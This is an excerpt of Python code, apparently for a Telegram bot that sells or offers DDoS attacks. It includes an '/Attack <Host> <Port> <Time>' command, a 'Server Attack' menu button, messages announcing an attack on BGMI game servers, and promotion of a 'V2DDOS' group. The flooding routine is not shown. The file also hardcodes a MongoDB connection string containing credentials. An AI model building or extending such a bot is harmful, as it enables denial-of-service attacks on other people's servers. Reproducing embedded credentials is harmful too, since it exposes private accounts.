...
MONGO_URI = 'mongodb+srv://Nand:<Nand@7061>@nycreation.tn1ab.mongodb.net/?retryWrites=true&w=majority&appName=NYCREATION'
...
def attack_command(message):
    ...
    try:
        ...
        bot.send_message(chat_id, "*Please Provide:\n<Host> <Port> <Time>🚀*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")
...
def process_attack_command(message):
    try:
        ...
        if len(args) != 3:
            bot.send_message(message.chat.id, "*Invalid command format. Please use: /Attack <Host> <Port> <Time>*", parse_mode='Markdown')
            return
        ...
        bot.send_message(message.chat.id, f"*Bgmi Fucking Started 💟😁\n\nHost: {target_ip}\nPort: {target_port}\nTime: {duration}\nMethod: Free User Of @TMZEROO✅*", parse_mode='Markdown')
    except Exception as e:
...
def send_welcome(message):
    ...
    # Create buttons
    btn1 = KeyboardButton("Server Attack🚀")
    btn2 = KeyboardButton("My Account🏦")
    btn3 = KeyboardButton("Canary Apk🖇️")
    btn4 = KeyboardButton("Admin🫂❤️")
...
def handle_message(message):
    if message.text == "Server Attack🚀":
        bot.reply_to(message, "*Use Less Than 600 Second 🌝*", parse_mode='Markdown')
        ...
        bot.reply_to(message, "*CANARY LINK🔗: https://t.me/creativeydv/2*", parse_mode='Markdown')
    elif message.text == "Admin🫂❤️":
        bot.reply_to(message, "*Admin @TMZEROO✅*", parse_mode='Markdown')
    else:
        bot.reply_to(message, "*JOIN @V2DDOS GROUP*", parse_mode='Markdown')
